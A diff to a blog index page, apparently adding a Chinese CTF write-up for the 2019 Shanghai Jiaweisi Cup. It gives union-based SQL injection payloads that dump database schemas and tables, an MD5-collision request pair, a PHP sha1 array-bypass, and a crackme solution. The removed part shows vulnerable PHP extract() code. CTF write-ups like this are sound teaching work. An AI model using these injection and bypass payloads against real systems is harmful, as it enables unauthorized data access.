@@ -166,6 +166,152 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-2019上海嘉韦思杯WP" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/30/2019上海嘉韦思杯WP/">2019上海“嘉韦思杯&#34;</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/30/2019上海嘉韦思杯WP/" class="archive-article-date">
+  	<time datetime="2019-03-30T03:59:45.618Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h1><p><a href="http://47.103.43.235:81/quest/web/a/index.php?gid=1" target="_blank" rel="noopener">题目地址：</a><br><img src="https://upload-images.jianshu.io/upload_images/15184404-877b8dd0ae463e58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>提交1’出现报错，判断字段数以及显示位</p>
+<blockquote>
+<p>1‘order by 1,2,3,4 #<br>1’ union select 1,2,3,4 #</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-fbdbe3c73609142e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>爆库</p>
+<blockquote>
+<p>1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4 #</p>
+</blockquote>
+<p>爆表</p>
+<blockquote>
+<p>1’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’luozhen’) #</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-16f72cde55f5d4ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>爆列</p>
+<blockquote>
+<p>1’ union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=’flag’) #</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-1562fde9afb36627.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>爆值</p>
+<blockquote>
+<p>1’ union select 1,2,3,group_concat(flag) from flag #</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-8f7055a0f3ee2673.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>得到flag</p>
+<blockquote>
+<p>flag{20_welcome_19 }</p>
+</blockquote>
+<h1 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h1><p><a href="http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt" target="_blank" rel="noopener">题目地址：</a><br>进去后发现是base64加密，利用chrome控制台解密<br><img src="https://upload-images.jianshu.io/upload_images/15184404-ba5518063a9449d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>得到JSfuck，利用在线解密网站进行解密<a href="https://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">https://www.bugku.com/tools/jsfuck/</a><br><img src="https://upload-images.jianshu.io/upload_images/15184404-c7fe895ec2e15800.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<blockquote>
+<p>flag{sdf465454dfgert32}</p>
+</blockquote>
+<h1 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h1><p><a href="http://47.103.43.235:82/crypto/a/index.php" target="_blank" rel="noopener">题目地址：</a><br><img src="https://upload-images.jianshu.io/upload_images/15184404-d37452681fa411a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>Base64加密，最后解密得到</p>
+<blockquote>
+<p>fB__l621a4h4g_ai%7B%26i%7D</p>
+</blockquote>
+<p>url解码后得到</p>
+<blockquote>
+<p>fB__l621a4h4g_ai{&amp;i}</p>
+</blockquote>
+<p>很像打乱的flag，试试栅栏。<br><img src="https://upload-images.jianshu.io/upload_images/15184404-c518d4893177ce1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>得到flag</p>
+<blockquote>
+<p>flag{B64_&amp;_2hai_14i}</p>
+</blockquote>
+<h1 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h1><p><a href="http://47.103.43.235:82/web/a/index.php" target="_blank" rel="noopener">题目地址：</a><br>计算题，和bugjku上的一道题类似，编写python脚本可以做出来<br><img src="https://upload-images.jianshu.io/upload_images/15184404-f711426227dbbb87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://47.103.43.235:82/web/a/index.php&quot;</span><br><span class="line">import requests, re</span><br><span class="line">a = requests.session()</span><br><span class="line">flag = a.get(url).text</span><br><span class="line">b = re.findall(r&apos;&lt;/p&gt;&lt;p&gt;.*&lt;/p&gt;&apos;, flag) #正则表达式找到算术式</span><br><span class="line">c = eval(b[0][7:-4]) #计算</span><br><span class="line">d = a.post(url, data=&#123;&quot;result&quot;: c&#125;) #burp抓包可得知要用result提交</span><br><span class="line">print(d.text)#打印结果</span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="https://upload-images.jianshu.io/upload_images/15184404-f2f7552fcf0ac061.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<blockquote>
+<p>flag{Y0U_4R3_3o_F4ST!}</p>
+</blockquote>
+<h1 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h1><p><a href="http://47.103.43.235:82/crypto/b/index.php" target="_blank" rel="noopener">题目地址：</a><br><img src="https://upload-images.jianshu.io/upload_images/15184404-7728d8d40cd58aa7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>发现密文和flag格式的ASCILL码的差值有一个规律<br>f-&gt;b  4<br>l-&gt;g  5<br>a-&gt;[  6<br>g-&gt;`  7<br>{-&gt;s  8<br>…..<br>}-&gt;d   25<br>都是明文同密文相减，按照如上规律可知<br><img src="https://upload-images.jianshu.io/upload_images/15184404-08b32123b5875a5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>同理得到完整明文</p>
+<blockquote>
+<p>flag{c4es4r_variation}</p>
+</blockquote>
+<h1 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h1><p><a href="http://47.103.43.235:85/a/" target="_blank" rel="noopener">题目地址：</a><br>起初觉得是注入，注了半天注不进去，查看源码发现是MD5碰撞<br><img src="https://upload-images.jianshu.io/upload_images/15184404-3cb1b4cf9ee69c5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>要求构造不同的param1和param2，但是MD5值要相同，百度找了两个MD5值相同的二进制文件，用urlcode构造出payload</p>
+<blockquote>
+<p>param1=<br>%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP<br>&amp;param2=<br>%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-b71570c49338d9cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>Burp放包得到flag<br><img src="https://upload-images.jianshu.io/upload_images/15184404-b91e674314bba139.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<blockquote>
+<p>flag{MD5@_@success}</p>
+</blockquote>
+<h1 id="梅津美治郎"><a href="#梅津美治郎" class="headerlink" title="梅津美治郎"></a>梅津美治郎</h1><p><a href="http://47.103.43.235:85/e/re1.zip" target="_blank" rel="noopener">题目地址：</a><br>发现没壳，拖进OD查看<br><img src="https://upload-images.jianshu.io/upload_images/15184404-360e676bdbc9e5e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>随意输入的密码和r0b0RUlez!进行比较，r0b0RUlez!很有可能就是密码，尝试输入发现密码正确但是还要输入一个密码。<br><img src="https://upload-images.jianshu.io/upload_images/15184404-454eeaa7488f2645.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>用IDA瞅一眼00401547<br><img src="https://upload-images.jianshu.io/upload_images/15184404-597fd03fe884d17f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>a1为用户输入密码<br>a2地址指向内容是u1nnf2lg，以0x02结束，用u1nnf2lg与0x02抑或，得到第二个密码 w3lld0ne<br><img src="https://upload-images.jianshu.io/upload_images/15184404-ef0a3402aeef631c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<blockquote>
+<p>flag{r0b0RUlez!_w3lld0ne}</p>
+</blockquote>
+<h1 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h1><p><a href="http://47.103.43.235:82/web/b/index.php" target="_blank" rel="noopener">题目地址:</a><br><img src="https://upload-images.jianshu.io/upload_images/15184404-24c351059c3e8c00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>尝试使用万能密码登陆失败，查看源代码<br><img src="https://upload-images.jianshu.io/upload_images/15184404-72ad6bb66f14da04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>发现一个可疑的地方，进去看看<br><img src="https://upload-images.jianshu.io/upload_images/15184404-62ac8b94b58097aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>想要得到flag需要满足条件name != password &amp; sha1(name) == sha1(password)<br>可以利用sha1()函数漏洞绕过利用burp构造两个字段为数组</p>
+<blockquote>
+<p>name[]=1&amp;password[]=2</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-be2034287feaba9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>放包，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/15184404-02f8fbf5ebc8e3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<blockquote>
+<p>flag{Y0u_just_br0ke_sha1}</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/30/2019上海嘉韦思杯WP/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sql学习笔记" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -878,82 +1024,6 @@
 
 
   
-    <article id="post-CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/">CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:52:25.707Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><p>题目链接：47.106.142.99:8001<br>进入后可看到如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$filename=__FILE__;</span><br><span class="line">$NYSEC=&quot;666&quot;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($NYSEC))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($filename));</span><br><span class="line">    if($NYSEC==$content)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        echo &quot;sorry!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; sorry!!</span><br></pre></td></tr></table></figure></p>
-        
-          <a class="article-more-a" href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1055,11 +1125,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">学习</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color3">学习</a>
               </li>
             
             <div class="clearfix"></div>
